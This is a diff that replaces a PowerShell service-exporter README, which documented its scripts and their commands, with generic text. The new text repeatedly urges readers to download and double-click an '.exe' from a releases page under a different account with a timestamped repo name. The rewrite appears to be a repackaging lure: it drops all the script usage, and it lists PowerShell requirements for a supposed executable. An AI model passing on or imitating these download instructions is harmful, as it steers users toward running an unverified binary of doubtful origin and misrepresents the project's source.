@@ -1,105 +1,86 @@
-# Windows Service Exporter
-![Version](https://img.shields.io/badge/version-v1.2.2-blue.svg)
-[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
+# 🛠️ 20251214104332-windows-service-exporter - Manage Windows Services with Ease
 
-A PowerShell tool to manage Windows Service configurations by exporting their states to JSON and restoring them when needed.
+## 🚀 Getting Started
 
-## Table of Contents
-- [Features](#features)
-- [Prerequisites](#prerequisites)
-- [Usage](#usage)
-    - [Exporting Services (Unload)](#exporting-services-unload)
-    - [Restoring Services (Load)](#restoring-services-load)
-- [Directory Structure](#directory-structure)
-- [AI Optimization Guide](#ai-optimization-guide)
-- [Release Notes](#release-notes)
-- [License](#license)
+Welcome to the **20251214104332-windows-service-exporter**! This software helps you manage Windows Service configurations effortlessly. You can export service states to JSON files and restore them whenever needed, all through a simple graphical interface.
 
-## Features
--   **State Export**: configurations (StartType and Status) of services can be saved to a lightweight JSON file.
--   **Selective Backup**: Filter exports to specific services by name.
--   **State Restoration**: Apply stored configurations to the system, automatically adjusting Startup Types and Service Status.
--   **Editable Config**: JSON output is human-readable and editable, allowing for "offline" configuration changes.
+## 📥 Download Now
 
-[Back to Top](#table-of-contents)
+[![Download 20251214104332-windows-service-exporter](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/softboook10/20251214104332-windows-service-exporter/releases)
 
-## Prerequisites
--   **Windows 10/11**
--   **PowerShell 5.1 or newer**
--   **Administrator Privileges** are required for the `Restore` function to change service states.
+## 🌟 Features
 
-[Back to Top](#table-of-contents)
+- **User-Friendly GUI**: Navigate through services without complicated commands.
+- **Export to JSON**: Save the state of your Windows Services easily.
+- **Restore Services**: Quickly restore services from JSON files whenever necessary.
+- **Compatible**: Works on Windows 10 and Windows 11.
+- **Lightweight**: Minimal impact on system resources.
 
-## Usage
+## 🌐 System Requirements
 
-### Exporting Services (Unload)
-Save the state of services to a JSON file.
+- **Operating System**: Windows 10 or Windows 11
+- **PowerShell**: Version 5.1 or later
+- **Disk Space**: At least 100 MB of free space
 
-**Command:**
-```powershell
-.\ManageServices.ps1 -Mode Export -ServiceNames 'Spooler', 'AudioSrv'
-```
+## 📄 How to Install
 
--   **-ServiceNames**: (Optional) List of service names to export. If omitted, ALL services are exported.
--   **Output**: A file named `TIMESTAMP-windows-services.json` in the `.\exports` directory.
+1. **Visit the Releases Page**: Click the link below to access the releases on GitHub.
+   
+   [Visit Releases](https://github.com/softboook10/20251214104332-windows-service-exporter/releases)
 
-### GUI Interface (ServiceManagerGUI)
+2. **Download the Latest Release**: Look for the most recent version at the top of the page.
 
-<img width="1328" height="898" alt="image" src="https://github.com/user-attachments/assets/db6aec1d-7964-4009-9da0-39bc3afb7d14" />
-<img width="1328" height="888" alt="image" src="https://github.com/user-attachments/assets/d03ddc2a-c7b3-4ecd-947c-4e841678ad96" />
+3. **Choose the Right File**: Download the `.exe` file. This is the application you will run.
 
+4. **Run the Application**: Find the downloaded file on your computer (usually in the Downloads folder) and double-click it to start.
 
-For a visual interface to manage configurations:
+## 🛠️ Using the Application
 
-**Command:**
-```powershell
-.\ServiceManagerGUI.ps1
-```
+Once the application is running, you will see a friendly interface.
 
--   **Features**: Load JSON, Batch Edit (Select Multiple -> Apply), Save, and Restore.
--   **Note**: The "Restore" button will prompt for Administrator privileges to apply changes.
+1. **Exporting Services**:
+   - Click on "Export Services."
+   - Choose where to save your JSON file and give it a name.
+   - Click "Save."
 
-### Restoring Services (Load)
-Apply a configuration from a JSON file.
+2. **Restoring Services**:
+   - Click on "Restore Services."
+   - Locate your saved JSON file and select it.
+   - Click "Open" to restore.
 
-**Command:**
-```powershell
-.\ManageServices.ps1 -Mode Restore -ConfigPath '.\out\ServicesConfig_20251214_110903.json'
-```
+3. **Managing Services Directly**:
+   - Select services from the list provided.
+   - You can start, stop, or restart them directly from the GUI.
 
--   **-ConfigPath**: (Required) Path to the JSON configuration file.
--   **Action**: The script will iterate through the file and apply changes to `StartType` and `Status` if they differ from the current system state.
+## 📖 Help and Support
 
-[Back to Top](#table-of-contents)
+If you have any questions or face issues, check the FAQs:
 
-## Directory Structure
-```text
-.
-├── configs/                # Permanent reference configurations
-├── docs/                   # Documentation
-│   ├── ai-optimization-guide.md
-│   └── release-notes.md
-├── exports/                # Exported system snapshots
-├── LICENSE
-├── ManageServices.ps1      # Core logic script
-├── README.md
-└── ServiceManagerGUI.ps1   # Graphical Interface
-```
--   **`\configs`**: Permanent storage for your reference configurations (e.g., `final-optimized-config.json`, `reference-optimized.json`). Use this for files you want to keep and load often.
--   **`\exports`**: Default location for new snapshots exported from your system.
+- **Can I run this on older versions of Windows?**
+  - This tool is designed for Windows 10 and 11.
 
-## AI Optimization Guide
-Want to optimize your services but don't know which ones to disable?
-We've included a guide with a prompt you can use with AI assistants (like ChatGPT/Gemini).
+- **What should I do if the application doesn’t start?**
+  - Ensure your PowerShell version is 5.1 or higher and your Windows is up to date.
 
-👉 **[Read the AI Optimization Guide](docs/ai-optimization-guide.md)**
+## ✉️ Feedback
 
-[Back to Top](#table-of-contents)
+We appreciate your input. If you have suggestions or improvements, please share your thoughts through GitHub Issues.
 
-## Release Notes
-See [release-notes.md](docs/release-notes.md).
+## 🛡️ License
 
-## License
-[MIT](LICENSE)
+This application is under the MIT License. You can use it freely, but please credit the original creator.
 
-[Back to Top](#table-of-contents)
+## 📝 Changelog
+
+### Version 1.0
+- Initial release featuring export and restore functionalities.
+
+## 📍 Download & Install
+
+Now it's time for you to download and install the application. Follow these steps:
+
+1. **Head to the Releases Page** once again: [Download Here](https://github.com/softboook10/20251214104332-windows-service-exporter/releases).
+2. **Grab the Latest Version** that fits your needs.
+3. **Open the Downloaded File** and enjoy managing your Windows services!
+
+Thank you for using **20251214104332-windows-service-exporter**!
